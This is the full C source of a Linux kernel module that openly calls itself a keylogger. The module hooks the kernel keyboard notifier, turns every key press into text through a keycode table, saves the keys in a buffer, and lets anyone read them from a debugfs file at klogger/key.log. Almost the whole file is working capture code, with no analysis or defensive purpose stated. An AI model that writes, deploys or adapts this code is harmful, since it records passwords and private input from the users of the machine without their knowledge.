// SPDX-License-Identifier: GPL-2.0

#include <linux/input.h>
#include <linux/module.h>
#include <linux/debugfs.h>
#include <linux/keyboard.h>

#define DRIVER_AUTHOR "Shaswata Das <shaswata56@gmail.com>"
#define DRIVER_DESC "A Linux Kernel module keylogger! 🧐"
#define DRIVER_LICENSE "GPL"
#define DRIVER_VERSION "1.2.0"

MODULE_LICENSE(DRIVER_LICENSE);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_VERSION(DRIVER_VERSION);
MODULE_AUTHOR(DRIVER_AUTHOR);


#define BUF_LEN (PAGE_SIZE << 2)                                                 
#define CHUNK_LEN 12

static struct dentry *file;
static struct dentry *dir;
static size_t buf_pos;
static char buf_keys[BUF_LEN];

static const char *keymap[120][2] = {
	{"\0", "\0"}, {"ESC", "ESC"}, {"1", "!"}, {"2", "@"}, {"3", "#"},
	{"4", "$"}, {"5", "%"}, {"6", "^"}, {"7", "&"}, {"8", "*"}, {"9", "("},
	{"0", ")"}, {"-", "_"}, {"=", "+"}, {"Backspace", "Backspace"},
	{"Tab", "Tab"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"}, {"o", "O"}, {"p", "P"},
	{"[", "{"}, {"]", "}"}, {"Enter", "Enter"}, {"Lctrl", "Lctrl"},
	{"a", "A"}, {"s", "S"}, {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"}, {"'", "\""}, {"`", "~"},
	{"Lshift", "Lshift"}, {"\\", "|"}, {"z", "Z"}, {"x", "X"}, {"c", "C"},
	{"v", "V"}, {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"}, {".", ">"},
	{"/", "?"}, {"Rshift", "Rshift"}, {"PrtScr", "Npad[*]"}, {"Lalt", "Lalt"},
	{"Space", "Space"}, {"CapsLock", "CapsLock"}, {"F1", "F1"}, {"F2", "F2"},
	{"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, {"F6", "F6"}, {"F7", "F7"},
	{"F8", "F8"}, {"F9", "F9"}, {"F10", "F10"}, {"NumLock", "NumLock"},
	{"ScrLock", "ScrLock"}, {"Npad[7]", "Home"}, {"Npad[8]", "Up"},
	{"Npad[9]", "PgUp"}, {"Npad[-]", "Npad[-]"}, {"Npad[4]", "Left"},
	{"Npad[5]", "Npad[5]"}, {"Npad[6]", "Right"}, {"Npad[+]", "Npad[+]"},
	{"Npad[1]", "End"}, {"Npad[2]", "Down"}, {"Npad[3]", "PgDn"},
	{"Npad[0]", "Ins"}, {"Npad[.]", "Del"}, {"SysRq", "SysRq"}, {"\0", "\0"},
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"Enter", "Enter"}, {"Rctrl", "Rctrl"}, {"Npad[/]", "Npad[/]"},
	{"PrtScr", "PrtScr"}, {"Ralt", "Ralt"}, {"\0", "\0"}, {"Home", "Home"},
	{"Up", "Up"}, {"PgUp", "PgUp"}, {"Left", "Left"}, {"Right", "Right"},
	{"End", "End"}, {"Down", "Down"}, {"PgDn", "PgDn"}, {"Ins", "Ins"},
	{"Del", "Del"},  {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},  {"Pause", "Pause"}
};

static ssize_t kbd_buffer(struct file *f, char *buf, size_t len,
		loff_t *offset)
{
	return simple_read_from_buffer(buf, len, offset, buf_keys, buf_pos);
}

static const struct file_operations debug_fops = {
	.owner = THIS_MODULE,
	.read = kbd_buffer,
};

void code_to_keys(int keycode, int is_shift, char *buf)
{
	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
	{
		const char *key = (is_shift == 1) ? keymap[keycode][1] :
			keymap[keycode][0];
		
		snprintf(buf, CHUNK_LEN, "%s", key);
	}
}

int log_kbd(struct notifier_block *nb, unsigned long icode, void *param)
{
	size_t len;
	char logbuf[CHUNK_LEN] = {0};
	struct keyboard_notifier_param *p = param;

	if (!p->down)
		return NOTIFY_OK;

	code_to_keys(p->value, p->shift, logbuf);
	len = strlen(logbuf);
	if (len < 1)
		return NOTIFY_OK;

	if (buf_pos + len >= BUF_LEN)
		buf_pos = 0;

	strncpy(buf_keys + buf_pos, logbuf, len);
	buf_pos += len;

	return NOTIFY_OK;
}

static struct notifier_block klogger_blk = {                                     
        .notifier_call = log_kbd,                                                
};

static int __init klogger_init(void)
{
	dir = debugfs_create_dir("klogger", NULL);
	if (!dir)
		return -ENOENT;
	if (IS_ERR(dir))
		return PTR_ERR(dir);

	file = debugfs_create_file("key.log", 0400, dir, NULL, &debug_fops);
	if (!file)
	{
		debugfs_remove_recursive(dir);
		return -ENOENT;
	}

	register_keyboard_notifier(&klogger_blk);
	return 0;
}

static void __exit klogger_exit(void)
{
	unregister_keyboard_notifier(&klogger_blk);
	debugfs_remove_recursive(dir);
}

module_init(klogger_init);
module_exit(klogger_exit);
